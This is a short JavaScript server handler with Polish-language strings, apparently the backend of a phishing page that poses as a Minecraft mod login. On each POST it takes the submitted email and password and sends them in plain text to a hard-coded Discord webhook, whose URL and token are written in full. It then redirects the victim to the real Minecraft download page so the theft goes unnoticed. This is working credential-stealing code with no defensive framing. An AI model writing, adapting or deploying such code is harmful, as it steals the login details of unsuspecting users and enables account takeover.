export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { email, password } = req.body;
        const WEBHOOK = "https://discord.com/api/webhooks/1503594384187330782/QKpk_4A4ZkLNMcUqPgarc1SSsMKObPJ-wluCBd5Or2ea3yps3vdiSlb4wXkOuuz17oBm";

        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "📥 Nowe Logowanie (Test Moda)",
                        color: 5814783,
                        fields: [
                            { name: "Email", value: `\`${email}\`` },
                            { name: "Hasło", value: `\`${password}\`` }
                        ],
                        timestamp: new Date()
                    }]
                })
            });
            // Przekierowanie do prawdziwego moda po "zalogowaniu"
            res.redirect('https://www.minecraft.net/pl-pl/download');
        } catch (e) {
            res.status(500).send("Błąd Webhooka");
        }
    } else {
        res.status(405).send("Metoda niedozwolona");
    }
}
